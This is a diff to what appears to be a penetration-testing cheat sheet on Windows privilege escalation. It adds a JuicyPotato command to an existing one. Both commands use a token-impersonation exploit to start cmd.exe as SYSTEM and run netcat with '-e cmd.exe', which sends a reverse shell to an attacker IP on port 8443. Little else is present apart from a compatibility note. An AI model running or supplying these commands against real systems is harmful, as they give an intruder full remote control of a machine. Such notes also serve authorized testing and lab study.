@@ -39,6 +39,9 @@ https://github.com/ohpe/juicy-potato
 ```
 xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.214 8443 -e cmd.exe" -t *
 ```
+```
+.\JuicyPotato.exe -l 10000 -p "C:\windows\system32\cmd.exe" -a "/c c:\users\public\downloads\nc.exe 10.10.14.2 8443 -e cmd.exe" -t *  -c "{d20a3293-3341-4ae8-9aaf-8e397cb63c34}"
+```
 JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. 
 ## PrintSpoofer
 https://github.com/itm4n/PrintSpoofer
